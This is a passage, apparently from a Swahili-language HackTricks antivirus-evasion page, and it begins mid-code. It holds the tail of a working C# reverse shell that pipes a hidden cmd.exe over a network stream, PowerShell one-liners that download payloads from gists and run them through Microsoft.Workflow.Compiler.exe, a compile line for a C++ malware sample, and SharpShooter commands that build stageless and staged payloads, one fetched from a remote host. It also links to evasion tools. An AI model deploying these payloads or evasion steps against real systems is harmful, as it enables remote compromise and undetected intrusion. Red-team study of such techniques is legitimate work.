using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### Kutumia compiler wa C#
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Upakuaji na utekelezaji wa moja kwa moja:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{% embed url="https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f" %}

Orodha ya waficha C# : [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
* [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
* [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
* [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
* [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
* [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Kutumia python kwa mfano wa kujenga sindano:

* [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Vifaa vingine
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### Zaidi

* [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
